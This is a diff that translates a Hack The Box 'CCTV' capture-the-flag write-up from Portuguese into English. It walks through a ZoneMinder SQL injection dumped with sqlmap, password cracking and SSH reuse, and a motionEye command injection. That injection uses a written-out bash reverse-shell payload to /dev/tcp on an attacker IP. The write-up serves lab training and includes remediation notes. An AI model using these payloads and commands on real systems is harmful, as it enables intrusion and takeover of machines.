@@ -1,315 +1,197 @@
-# Hack The Box — CCTV
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-Web%20%2B%20SQLi%20%2B%20Privesc-red)
+CCTV is an Easy Linux machine running a **ZoneMinder** CCTV platform. A SQL
+injection in ZoneMinder (CVE-2024-51482) exposes the user password hashes; the
+recovered credentials for `mark` are reused for SSH access. From there, a
+locally bound **motionEye** service is reached through an SSH tunnel and abused
+via a command injection in the *Image File Name* field (CVE-2025-60787),
+yielding a reverse shell as **root**.
 
----
+## Machine Information
 
-# Informações da Máquina
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| CCTV | Easy | Linux | Hack The Box |
 
-| Nome  | Dificuldade | Plataforma    | OS    |
-| ----- | ---------- | ------------ | ----- |
-| CCTV | Easy | Hack The Box | Linux |
+## Attack Path
 
----
+1. Nmap reveals SSH and HTTP, with the web app redirecting to `cctv.htb`.
+2. The web application is identified as ZoneMinder.
+3. A SQL injection in ZoneMinder is exploited to dump the `Users` table.
+4. The hash for `mark` is cracked offline, recovering the password.
+5. The password is reused to obtain SSH access as `mark`.
+6. The local-only motionEye service is reached via an SSH tunnel.
+7. A command injection in motionEye returns a reverse shell as root.
 
-# Superfície de ataque
+## Reconnaissance
 
-```
-1. Enumeração inicial revelou SSH e HTTP.
-2. A aplicação web exposta utilizava ZoneMinder.
-3. Foi explorada uma SQL Injection no endpoint de requisições do ZoneMinder.
-4. O dump do banco permitiu obter hashes de usuários e quebrar a senha do usuário mark.
-5. Com acesso SSH como mark, foi possível tunelar o serviço local motionEye.
-6. No motionEye, uma injeção de comando no campo de nome do arquivo gerou shell reversa como root.
-```
+Initial enumeration was performed with Nmap to identify open ports, services
+and versions.
 
----
-
-# Reconhecimento
-
-A enumeração inicial foi realizada com Nmap para identificar portas abertas, serviços e versões.
-
-```
+```bash
 nmap -sC -sV -A 10.129.23.191
 ```
 
-![Nmap Scan](screenshots/nmap.png)
+| Port | Service | Notes |
+| --- | --- | --- |
+| 22/tcp | SSH | OpenSSH 9.6p1 on Ubuntu 24.04 |
+| 80/tcp | HTTP | Apache 2.4.58, redirects to `http://cctv.htb/` |
 
-### Descobertas
+The main entry point was the web service. After adding `cctv.htb` to
+`/etc/hosts`, enumeration focused on the HTTP application.
 
-| Porta | Serviço | Observações |
-| ------ | --------- | ------- |
-| 22/tcp | SSH | OpenSSH 9.6p1 em Ubuntu 24.04. |
-| 80/tcp | HTTP | Apache 2.4.58 com redirecionamento para `http://cctv.htb/`. |
+## Web Enumeration
 
-O ponto de entrada principal era o serviço web. Após ajustar o `/etc/hosts` para resolver `cctv.htb`, a enumeração passou a focar na aplicação HTTP.
+Content discovery was used to map the application and identify the software
+running on the target.
 
----
-
-# Enumeração Web
-
-O primeiro passo foi identificar conteúdo web adicional e entender qual aplicação estava rodando no alvo.
-
-```
+```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://cctv.htb/FUZZ -mc 200
 ```
 
-![FFUF](screenshots/ffuf.png)
+The interface and discovered endpoints identified the application as
+**ZoneMinder**, a CCTV monitoring platform. Enumeration then focused on its
+components and known vulnerabilities.
 
-A interface e os endpoints encontrados indicavam o uso do **ZoneMinder**, uma plataforma de monitoramento CCTV. Com isso, a enumeração passou a focar nos componentes da aplicação e em possíveis falhas conhecidas ou pontos inseguros de acesso.
+## Exploitation — SQL Injection (ZoneMinder)
 
-Ferramentas utilizadas nesta etapa:
-
-* ffuf
-* Browser
-* inspeção de endpoints do ZoneMinder
-
----
-
-# Exploração — SQL Injection no ZoneMinder
-
-Durante a análise da aplicação, foi encontrado o CVE-2024–51482 e o endpoint abaixo mostrou-se vulnerável a **SQL Injection**:
+Analysis surfaced **CVE-2024-51482**: the endpoint below was vulnerable to SQL
+injection.
 
 ```
 http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
 ```
 
-A exploração foi automatizada com o `sqlmap`, reutilizando a sessão autenticada por cookie.
+Exploitation was automated with `sqlmap`, reusing the authenticated session
+cookie.
 
-```
+```bash
 sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
---dump -T Users -C Username,Password \
---batch \
---dbms=MySQL \
---technique=T \
---cookie="ZMSESSID=1hh7m1gb370gmerocuk05hppvn"
+  --dump -T Users -C Username,Password \
+  --batch \
+  --dbms=MySQL \
+  --technique=T \
+  --cookie="ZMSESSID=1hh7m1gb370gmerocuk05hppvn"
 ```
 
-![SQLMap](screenshots/sqlmap.png)
+This confirmed access to the `zm` database and dumped the `Users` table. The
+recovered accounts were `superadmin`, `mark` and `admin`. The next step was to
+crack the hashes offline.
 
-O resultado confirmou o acesso ao banco `zm`, com dump da tabela `Users`.
+## Credential Cracking
 
-![Dump da tabela Users](screenshots/bd-dump.png)
+The hash for `mark` was saved to a file and cracked with `john` using the
+`rockyou.txt` wordlist.
 
-Os hashes recuperados foram:
-
-* `superadmin`
-* `mark`
-* `admin`
-
-Como o objetivo era obter acesso ao sistema, o próximo passo foi quebrar os hashes offline.
-
----
-
-# Quebra de Hash e Credenciais
-
-O hash do usuário `mark` foi salvo em arquivo e testado com `john` usando a wordlist `rockyou.txt`.
-
-```
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-![John](screenshots/john.png)
-
-A senha recuperada foi:
+The recovered password was:
 
 ```
 mark : opensesame
 ```
 
-Com isso, já era possível tentar autenticação SSH no sistema.
+## Initial Access (User)
 
----
+The credentials recovered from the database were reused to authenticate over
+SSH as `mark`.
 
-# Acesso Inicial
-
-Usando as credenciais obtidas no banco, foi possível acessar o host por SSH como o usuário `mark`.
-
-```
+```bash
 ssh mark@cctv.htb
 ```
 
-![SSH como mark](screenshots/user-shell.png)
+This provided the initial foothold on the system. The user flag lives at
+`/home/sa_mark/user.txt`.
 
-Esse foi o acesso inicial válido ao sistema.
+## Privilege Escalation
 
----
+### Enumeration
 
-# Enumeração para Escalação de Privilégio
+With a shell as `mark`, local enumeration revealed two relevant facts:
 
-Com shell como `mark`, a enumeração local mostrou dois pontos importantes:
+1. The host ran both **ZoneMinder** and **motionEye**.
+2. The **motionEye** service was bound to localhost only on `127.0.0.1:8765`.
 
-1. O host executava **ZoneMinder** e também **motionEye**.
-2. O serviço **motionEye** estava acessível apenas localmente em `127.0.0.1:8765`.
-
-A listagem de portas e serviços confirmou esse cenário.
-
-```
+```bash
 ss -tlnp
 systemctl list-units --type=service --state=running
 ```
 
-![Serviços e portas locais](screenshots/services.png)
+Reading the motionEye configuration confirmed the service was in use and worth
+inspecting through its admin interface.
 
-Em seguida, a leitura do arquivo de configuração do motionEye trouxe mais contexto sobre o serviço:
-
-```
+```bash
 cat /etc/motioneye/motion.conf
 ```
 
-![Configuração do motionEye](screenshots/motioneye-login.png)
-
-Mesmo sem expor diretamente uma credencial em texto puro, essa etapa ajudou a confirmar que o ambiente realmente usava **motionEye** e que valia a pena inspecionar sua interface administrativa local.
-
-Como a aplicação estava bindada em localhost, foi feito um túnel SSH para acessá-la a partir da máquina atacante.
+Since the application was bound to localhost, an SSH tunnel was used to reach it
+from the attacker machine.
 
 ```bash
 ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
 ```
 
-![Port forwarding](screenshots/port-forwarding.png)
+With the tunnel active, the motionEye panel was reachable at
+`http://127.0.0.1:8765`.
 
-Com o túnel ativo, o painel do motionEye ficou acessível localmente em `http://127.0.0.1:8765`.
+### motionEye RCE (CVE-2025-60787)
 
----
+The **Image File Name** field was vulnerable to command injection. It accepted a
+malicious string that was executed by the service, allowing a reverse shell
+payload.
 
-# Escalação de Privilégio — motionEye RCE
-
-Dentro da interface do motionEye, foi identificado um ponto explorável no campo **Image File Name** conforme o CVE-2025–60787. Esse campo aceitava uma string maliciosa capaz de provocar **injeção de comando**, permitindo executar um payload de shell reversa.
-
-Payload utilizado:
-
-```
+```bash
 $(/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.233/4444 0>&1')
 ```
 
-Ao inserir o payload na configuração e salvar, o motionEye executou o comando no servidor.
+A listener was prepared on the attacker machine:
 
-![Payload no motionEye](screenshots/motioneye-rce.png)
-
-Na máquina atacante, um listener foi preparado com Netcat:
-
-```
+```bash
 nc -lvnp 4444
 ```
 
-Quando o serviço processou a configuração, a conexão reversa foi recebida com privilégios de **root**.
-
-![Root Shell](screenshots/root-shell.png)
-
-A saída do `id` confirmou:
+After saving the configuration, motionEye executed the command and a reverse
+connection was received as **root**.
 
 ```
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Essa escalada foi possível porque o processo responsável por manipular a funcionalidade explorada no motionEye rodava com privilégios elevados, transformando a injeção de comando em **RCE como root**.
+The injection ran as root because the process handling the affected feature was
+running with elevated privileges, turning the command injection into RCE as
+root. The root flag lives at `/root/root.txt`.
 
----
+## Vulnerability Analysis
 
-# Flag de Usuário
+**SQL Injection in ZoneMinder (CVE-2024-51482)** — the
+`request=event&action=removetag` endpoint accepted attacker-controlled input,
+allowing extraction of the MySQL database including user password hashes and
+leading to account compromise through password reuse. Fix: upgrade ZoneMinder,
+use parameterized queries, and apply least-privilege to the database account.
 
-Após o login, a flag de usuário foi localizada no diretório home de `sa_mark`.
+**Credential reuse** — the password recovered for `mark` in the database was
+also valid for SSH, turning a web compromise into operating system access. Fix:
+enforce unique credentials per service and rotate exposed passwords.
 
-```
-cd /home/sa_mark
-ls
-cat user.txt
-```
+**Command Injection / RCE in motionEye (CVE-2025-60787)** — the image file name
+field was processed insecurely by a service running with elevated privileges,
+turning a config field into root RCE. Fix: upgrade motionEye, validate/escape
+configuration input, and run the service as an unprivileged user.
 
-![User Flag](screenshots/user-flag.png)
+## Tools Used
 
-```
-fba447.....................
-```
+- Nmap
+- ffuf
+- sqlmap
+- John the Ripper
+- SSH
+- Netcat
 
----
+## Key Takeaways
 
-# Flag Root
-
-Com a shell privilegiada, bastou ler a flag em `/root/root.txt`.
-
-```
-cd /root
-ls
-cat root.txt
-```
-
-![Root Flag](screenshots/root-flag.png)
-
-```
-4f2da2.....................
-```
-
----
-
-# Vulnerabilidades Identificadas
-
-### 1. SQL Injection no ZoneMinder
-
-Descrição:
-
-* O endpoint `request=event&action=removetag` aceitava entrada manipulável.
-* Isso permitiu extração de dados do banco MySQL.
-* O atacante conseguiu obter hashes de senha de usuários da aplicação.
-
-Impacto:
-
-* vazamento de credenciais
-* comprometimento de contas válidas
-* acesso inicial ao sistema via reutilização de senha no SSH
-
-### 2. Reutilização de credenciais
-
-Descrição:
-
-* A senha recuperada para `mark` no banco também era válida para autenticação no sistema.
-* Isso transformou um comprometimento da aplicação web em acesso ao host.
-
-Impacto:
-
-* pivot da camada web para o sistema operacional
-* acesso interativo por SSH
-
-### 3. Command Injection / RCE no motionEye
-
-Descrição:
-
-* O campo de nome do arquivo de imagem aceitou payload malicioso.
-* O valor foi interpretado de forma insegura pelo serviço.
-* Como o processo estava com privilégios elevados, a execução resultou em shell como root.
-
-Impacto:
-
-* execução remota de comandos
-* escalada direta para root
-* comprometimento total da máquina
-
----
-
-# Ferramentas Utilizadas
-
-* Nmap
-* ffuf
-* sqlmap
-* John the Ripper
-* SSH
-* Netcat
-
----
-
-# Principais Aprendizados
-
-* Uma SQL Injection aparentemente simples pode ser suficiente para comprometer toda a máquina quando há reutilização de credenciais.
-* Serviços bindados em `localhost` ainda podem ser explorados após acesso inicial, especialmente com SSH tunneling.
-* Interfaces administrativas internas expostas apenas localmente não são sinônimo de segurança, principalmente quando possuem injeção de comando.
-* Enumerar serviços locais após o foothold é essencial para encontrar caminhos de privesc fora do fluxo tradicional de sudo, SUID ou cron.
-
----
-
-# Autor
-
-https://github.com/ninjaa-exe
+- A seemingly simple SQL injection can compromise an entire machine when credentials are reused.
+- Services bound to `localhost` are still reachable after a foothold, especially through SSH tunneling.
+- Internal admin interfaces exposed only locally are not inherently safe, particularly when they contain command injection.
+- Enumerating local services after the foothold is essential for finding privesc paths outside the usual sudo, SUID or cron vectors.
